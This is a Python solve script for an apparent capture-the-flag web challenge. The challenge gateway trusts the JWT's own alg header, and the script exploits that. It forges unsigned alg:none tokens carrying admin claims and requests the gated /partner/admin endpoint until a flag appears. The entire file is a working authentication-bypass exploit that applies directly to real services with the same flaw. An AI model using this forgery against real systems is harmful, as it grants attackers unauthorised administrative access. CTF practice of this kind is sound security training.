#!/usr/bin/env python3
"""
ConnectAPI Partner Gateway (auth, 150) — CWE-347, JWT alg:none signature bypass.

The gateway trusts the token's own `alg` header. We forge a token with
alg:none and partner=admin (empty signature) and call the gated /partner/admin.

Usage:
    python3 solve.py                          # defaults to auth7.chal.deti:8066
    python3 solve.py http://auth7.chal.deti:8066
"""
import base64
import json
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://auth7.chal.deti:8066"
ADMIN = f"{BASE}/partner/admin"

FLAG_RE = re.compile(r"flag\{[^}]*\}")


def b64url(obj: dict) -> str:
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def forge(claims: dict) -> str:
    header = b64url({"alg": "none", "typ": "JWT"})
    payload = b64url(claims)
    return f"{header}.{payload}."  # empty signature


def main() -> int:
    for claims in (
        {"partner": "admin"},
        {"partner": "admin", "iat": 1794404873},
        {"partner": "acme", "role": "admin"},
        {"partner": "acme", "admin": True},
    ):
        token = forge(claims)
        r = requests.get(ADMIN, headers={"Authorization": f"Bearer {token}"}, timeout=10)
        m = FLAG_RE.search(r.text)
        if m:
            print(f"[+] claims {claims} -> {m.group(0)}")
            return 0
    print("[-] alg:none forgery did not yield a flag")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
